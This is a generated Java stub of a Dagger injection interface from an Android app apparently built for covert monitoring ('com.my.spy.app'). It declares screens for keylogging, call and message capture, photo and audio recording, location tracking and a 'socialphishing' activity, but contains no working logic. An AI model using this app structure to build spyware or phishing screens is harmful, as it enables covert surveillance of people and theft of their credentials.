package com.my.spy.app.di.component;

@com.my.spy.app.di.PerActivity
@dagger.Component(dependencies = {com.my.spy.app.di.component.AppComponent.class}, modules = {com.my.spy.app.di.module.ActivityModule.class})
@kotlin.Metadata(mv = {1, 8, 0}, k = 1, xi = 48, d1 = {"\u0000^\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\bg\u0018\u00002\u00020\u0001J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0004\u001a\u00020\u0005H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0006\u001a\u00020\u0007H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\b\u001a\u00020\tH&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\n\u001a\u00020\u000bH&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\f\u001a\u00020\rH&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u000e\u001a\u00020\u000fH&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0010\u001a\u00020\u0011H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0012\u001a\u00020\u0013H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0014\u001a\u00020\u0015H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0016\u001a\u00020\u0017H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0018\u001a\u00020\u0019H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u001a\u001a\u00020\u001bH&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u001c\u001a\u00020\u001dH&\u00a8\u0006\u001e"}, d2 = {"Lcom/my/spy/app/di/component/ActivityComponent;", "", "inject", "", "loginActivity", "Lcom/my/spy/app/ui/activities/login/LoginActivity;", "mainChildActivity", "Lcom/my/spy/app/ui/activities/mainchild/MainChildActivity;", "mainParentActivity", "Lcom/my/spy/app/ui/activities/mainparent/MainParentActivity;", "registerActivity", "Lcom/my/spy/app/ui/activities/register/RegisterActivity;", "socialActivityM", "Lcom/my/spy/app/ui/activities/socialphishing/SocialActivityM;", "callsFragment", "Lcom/my/spy/app/ui/fragments/calls/CallsFragment;", "keysFragment", "Lcom/my/spy/app/ui/fragments/keylog/KeysFragment;", "mapsFragment", "Lcom/my/spy/app/ui/fragments/maps/MapsFragment;", "messageFragment", "Lcom/my/spy/app/ui/fragments/message/MessageFragment;", "notifyMessageFragment", "Lcom/my/spy/app/ui/fragments/notifications/NotifyMessageFragment;", "photoFragment", "Lcom/my/spy/app/ui/fragments/photo/PhotoFragment;", "recordingFragment", "Lcom/my/spy/app/ui/fragments/recording/RecordingFragment;", "socialFragment", "Lcom/my/spy/app/ui/fragments/social/SocialFragment;", "app_debug"})
public abstract interface ActivityComponent {
    
    public abstract void inject(@org.jetbrains.annotations.NotNull
    com.my.spy.app.ui.activities.login.LoginActivity loginActivity);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull
    com.my.spy.app.ui.activities.register.RegisterActivity registerActivity);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull
    com.my.spy.app.ui.activities.mainparent.MainParentActivity mainParentActivity);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull
    com.my.spy.app.ui.activities.mainchild.MainChildActivity mainChildActivity);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull
    com.my.spy.app.ui.activities.socialphishing.SocialActivityM socialActivityM);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull
    com.my.spy.app.ui.fragments.maps.MapsFragment mapsFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull
    com.my.spy.app.ui.fragments.calls.CallsFragment callsFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull
    com.my.spy.app.ui.fragments.message.MessageFragment messageFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull
    com.my.spy.app.ui.fragments.photo.PhotoFragment photoFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull
    com.my.spy.app.ui.fragments.keylog.KeysFragment keysFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull
    com.my.spy.app.ui.fragments.social.SocialFragment socialFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull
    com.my.spy.app.ui.fragments.recording.RecordingFragment recordingFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull
    com.my.spy.app.ui.fragments.notifications.NotifyMessageFragment notifyMessageFragment);
}